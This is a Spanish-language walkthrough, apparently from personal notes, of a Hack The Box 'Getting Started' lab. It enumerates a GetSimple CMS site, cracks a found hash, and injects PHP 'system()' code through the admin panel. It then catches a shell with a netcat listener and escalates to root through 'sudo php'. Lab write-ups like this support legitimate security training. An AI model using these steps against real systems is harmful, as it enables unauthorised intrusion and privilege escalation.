...
![](../../../../../images/Miniaturas/Getting_Started.png)
...
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/ipobjetivo.png)
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/Objetivo2.png)
...
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/Inicio.png)
...
```
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/nmap1.png)
**Párametros**:
...
```
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/nmap2.png)
**Párametros**:
...
whatweb http://{IP}:80
```
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/whatweb.png)

También podemos contrastar con **curl:**
```bash
curl -I http://{IP}:80
```
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/curl.png)

Vamos a echarle un vistazo a la página web:
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/web1.png)

Y leemos que están usando un CMS llamado GetSimple. Podemos **investigar** un poco en google a ver de que se trata.

Podemos proceder a hacerle fuzzing a esta dirección a ver si encontramos rutas o archivos accesibles.
```bash
gobuster dir -u http://{IP} -w {/path/to/wordlist/}
```
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/gobuster.png)
Con esto podemos ir trabajando vamos con data
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/data.png)
Dentro de estas carpetas encontramos 
- http://{IP}/data/other/website.xml
- Que el sitio tiene por nombre http://gettingstarted.htb/ -> Esto lo podemos añadir a nuestro /etc/hosts. 
- http://{IP}/data/other/authorization.xml
- Apikey -> `<![CDATA[ 4f399dc72ff8e619e327800f851e9986 ]]>`
- http://{IP}/data/other/plugins.xml
- Obtenemos 2 plugins (anonymous_data.php y InnovationPlugin.php)
...
Podemos intentar decodificar esta cadena, tiene pinta de ser un password. [Crackstation](https://crackstation.net/)

![](../../../../../images/HTB_modulos/Getting_Started_lab_1/hash.png)
...
Seguimos buscando y obtenemos un panel de autenticación 
 http://{IP}/admin/
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/admin.png)
Probamos las credenciales que tenemos y para adentro!
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/autenticado.png)
...
- Podemos también editar el sitemap
 ...
 ![](../../../../../images/HTB_modulos/Getting_Started_lab_1/wapp.png)
...
<?php system('id'); ?> 
```
 ![](../../../../../images/HTB_modulos/Getting_Started_lab_1/component1.png)
 ![](../../../../../images/HTB_modulos/Getting_Started_lab_1/component2.png)
...
```
 ![](../../../../../images/HTB_modulos/Getting_Started_lab_1/component3.png)
Nos ponemos en escucha con netcat:
```bash
nc -lvnp 4444
```
 ![](../../../../../images/HTB_modulos/Getting_Started_lab_1/rshell1.png)
Y hacemos la petición a http://{IP}
Y vemos que tenemos una terminal /bin/sh/
 ![](../../../../../images/HTB_modulos/Getting_Started_lab_1/rshell2.png)

Lo siguiente que debemos hacer es darle tratamiento a la tty para poder trabajar cómodos:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
 ![](../../../../../images/HTB_modulos/Getting_Started_lab_1/rshell3.png)

Nos podemos mover en el servidor para encontrar la primera flag
 ![](../../../../../images/HTB_modulos/Getting_Started_lab_1/flag1.png)
...
sudo -l
```
 ![](../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada.png)
...
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada2.png)Ponemos php y tocamos en sudo que es lo que tenemos ahora mismo posible ejecutar:
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada3.png)
Vale lo que vamos a hacer una pequeña modificación al comando para ejecutarlo de una:
```bash
sudo php -r "system('/bin/bash');"
```
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada4.png)
...
cat root.txt
```
![](../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada5.png)
